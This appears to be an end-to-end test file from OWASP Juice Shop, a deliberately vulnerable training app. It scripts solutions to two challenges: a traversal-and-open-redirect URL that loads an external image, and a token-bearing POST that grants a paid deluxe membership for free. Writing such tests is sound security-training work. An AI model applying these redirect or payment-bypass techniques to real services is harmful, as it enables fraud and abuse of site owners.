/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')

describe('/#/deluxe-membership', () => {
  describe('challenge "svgInjection"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should be possible to pass in a forgotten test parameter abusing the redirect-endpoint to load an external image', () => {
      browser.get('/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F200%2F100%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop')
    })

    protractor.expect.challengeSolved({ challenge: 'Cross-Site Imaging' })
  })

  describe('challenge "freeDeluxe"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should upgrade to deluxe for free by making a post request to /#/deluxe-membership by setting the payUsingWallet parameter to false', () => {
      browser.get('/#/')
      browser.manage().getCookie('token').then((token) => {
        browser.executeAsyncScript(() => {
          var callback = arguments[arguments.length - 1] // eslint-disable-line
          var xhttp = new XMLHttpRequest()
          xhttp.open('POST', 'http://localhost:3000/rest/deluxe-membership', true)
          xhttp.setRequestHeader('Authorization', 'Bearer ' + token.value)
          xhttp.onreadystatechange = () => {
            if (this.readyState === 4) {
              callback(JSON.parse(this.responseText))
            }
          }
          xhttp.send()
        }).then(response => {
          protractor.expect(response.status).toEqual('success')
          protractor.expect.challengeSolved({ challenge: 'Free Deluxe Account' })
        })
      })
    })
  })
})
